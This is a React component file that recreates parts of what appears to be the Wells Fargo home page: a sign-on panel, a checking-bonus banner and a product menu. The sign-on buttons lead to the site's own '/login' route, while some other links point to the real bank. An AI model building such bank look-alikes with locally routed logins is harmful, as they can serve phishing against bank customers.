import checkingDesktop from "../assets/checking-desktop.jpg";
import checkingTablet from "../assets/checking-tablet.jpg";
import checkingMobile from "../assets/checking-mobile.jpg";
import { CHECKING_OFFER_URL } from "../campaigns";
import { bankUrl, PRODUCT_NAV } from "../data";
import { useNavigate } from "./Icons";

function SignOnPreview() {
  const hour = new Date().getHours();
  const greeting = hour < 12 ? "Good morning" : hour < 18 ? "Good afternoon" : "Good evening";
  const navigate = useNavigate();

  return (
    <aside className="signon-preview" aria-labelledby="signon-title">
      <div className="signon-body">
        <h2 id="signon-title">{greeting}</h2>
        <p>Sign on to manage your accounts.</p>
        <div className="signon-sample" aria-hidden="true">
          <div className="signon-line">Username</div>
          <div className="signon-line">Password <span>Show</span></div>
          <div className="signon-sample-check"><span />Save username</div>
        </div>
        <div className="signon-actions">
          <button type="button" className="wf-button wf-button-red" onClick={() => navigate("/login")}>Sign On</button>
          <a href="/enroll">Enroll</a>
        </div>
      </div>
      <div className="signon-links">
        <button type="button" className="signon-link" onClick={() => navigate("/login?passkey=1")}>Sign on with a passkey</button>
        <a href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp/">Forgot username or password?</a>
        <a href={bankUrl("/privacy-security/fraud/")}>Security Center</a>
      </div>
    </aside>
  );
}

export function Marquee() {
  return (
    <section className="checking-hero" aria-labelledby="checking-title">
      <picture className="checking-hero-art">
        <source media="(min-width: 1080px)" srcSet={checkingDesktop} />
        <source media="(min-width: 570px)" srcSet={checkingTablet} />
        <img src={checkingMobile} width="570" height="320" alt="" fetchPriority="high" />
      </picture>
      <SignOnPreview />
      <div className="checking-hero-copy">
        <h1 id="checking-title">$325 checking bonus on us</h1>
        <p>New customers open an eligible checking account with qualifying direct deposits</p>
        <a className="wf-button" href={CHECKING_OFFER_URL} aria-label="Get started with the checking bonus offer">
          Get started &gt;&gt;
        </a>
      </div>
    </section>
  );
}

export function ProductDirectory() {
  return (
    <nav className="product-directory" aria-label="Personal products">
      <ul>
        {PRODUCT_NAV.map(({ label, href, icon }) => (
          <li key={label}>
            <a href={bankUrl(href)}>
              <span className="wf-sprite product-icon" style={{ backgroundPosition: icon }} aria-hidden="true" />
              {label}
            </a>
          </li>
        ))}
      </ul>
    </nav>
  );
}